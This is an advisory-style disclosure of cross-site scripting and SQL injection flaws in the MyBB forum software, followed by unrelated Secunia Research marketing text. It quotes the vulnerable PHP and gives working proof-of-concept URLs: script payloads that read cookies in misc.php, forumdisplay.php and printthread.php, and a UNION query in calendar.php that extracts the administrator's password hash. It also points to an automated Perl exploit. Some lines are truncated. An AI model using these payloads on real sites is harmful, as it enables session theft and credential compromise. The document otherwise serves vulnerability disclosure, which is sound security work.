"MyBB is a powerful, efficient and free forum package developed in PHP and

customisation of your forums using the template system."

--) Cross-Site Scripting (XSS)

Let's look at code from misc.php at line 310:

    <?
    ...
    $url = $settings['bburl']."/rss.php";
    if(!$all)
    {
      $url .= "?fid=$syndicate";
      $add = 1;
    }
    if($version != "rss")
    {
      if(!$add)
      {
        $url .= "?";
      }
      else
      {
        $url .= "&";
      }
      $url .= "type=$version";
      $add = 1;
    }
    if($limit)
    {
      if($limit > 100)
      {
        $limit = 100;
      }
      if(!$add)
      {
        $url .= "?";
      }
      else
      {
        $url .= "&";
      }
      $url .= "limit=$limit";
    }
    ...
    ?>

This piece of code has the task of complete the $url variable that will
print as is in the result page. All the variables that compose the URL
($syndicate (note line 305: $syndicate.= $comma.$fid), $version, $limit) can
be controlled by a remote user and when MyBB take the value doesn't sanitise
properly it. So it's possible to perform a Cross-Site Scripting attack by
sending some requests like these (one for every variable):

<http://www.example.com/mybb/misc.php?action=syndication&forums>[[0]](#0)=%3Cscript%
3Ealert(document.cookie)%3C/script%3E

<http://www.example.com/mybb/misc.php?action=syndication&forums>[[0]](#0)=0&version=
%3Cscript%3Ealert(document.cookie)%3C/script%3E

<http://www.example.com/mybb/misc.php?action=syndication&limit=%22%3E%3Cscrip>
t%3Ealert(document.cookie)%3C/script%3E

Unfortunately for this board, there are many others parameters that doesn't
check properly if someone inject some HTML maliciuos code, or other:

<http://www.example.com/mybb/forumdisplay.php?fid=1&datecut=%22%3E%3Cscript%3>
Ealert(document.cookie)%3C/script%3E

<http://www.example.com/mybb/forumdisplay.php?fid=2&page=%22%3E%3Cscript%3Eal>

<http://www.example.com/mybb/printthread.php?tid=1%3Cscript%3Ealert>(document.
cookie)%3C/script%3E

--) SQL Injection

Let's look at code from calendar.php at line 54:

    <?
    ...
    if($action == "event")
    {
      $query = $db->query("SELECT e.*, u.username, g.namestyle FROM
".TABLE_PREFIX."events e LEFT JOIN ".TABLE_PREFIX."users u ON
(e.author=u.uid) LEFT JOIN ".TABLE_PREFIX."usergroups g ON
(u.usergroup=g.gid) WHERE e.eid='$eid'");
    ...
    ?>

What we are seeing is a query to the SQL DB for create the result page with
the correct data from the calendar. The problem occurs becouse the $eid
parameter in the WHERE clause is put in the SQL query with any sanitisation
before, so a malicious user will be able to do an SQL injecion attack to the
database for obtain what he want.
This is a proof of concept exploit that it's able to show the MD5 hash of
the password of the board's administrator:

<http://www.example.com/mybb/calendar.php?action=event&eid=>'%20UNION%20SELECT
%20uid,uid,null,null,null,null,password,null%20FROM%20mybb_users/*

Unfortunately (or fortunately, by the point of view) this PoC doesn't work
on all the versions and configurations of MySQL Database.
For automate the explotation process I've made with FAiN182 a Perl exploit
here available: <http://albythebest.altervista.org/mybb.pl>
As for the XSS attack before, also for the SQL injection attack, there are
many vulnerables parameters. These are the most important:

    <http://www.example.com/mybb/online.php?pidsql=>)[sql_query]
    <http://www.example.com/mybb/memberlist.php?usersearch=%>'[sql_query]
    <http://www.example.com/mybb/editpost.php?pid=>'[sql_query]

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
